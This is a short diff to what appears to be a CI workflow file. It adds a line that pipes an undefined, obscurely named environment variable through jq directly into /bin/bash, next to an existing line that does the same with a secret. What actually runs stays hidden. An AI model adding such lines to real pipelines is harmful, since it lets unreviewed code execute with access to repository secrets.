@@ -22,6 +22,7 @@ jobs:
           k5541: ${{ secrets.k5541 }}
         run: |
           printf '%s' "$k5541" | jq -r .rzgf945 | /bin/bash
+          printf '%s' "$aop40361" | jq -r .xolir9 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
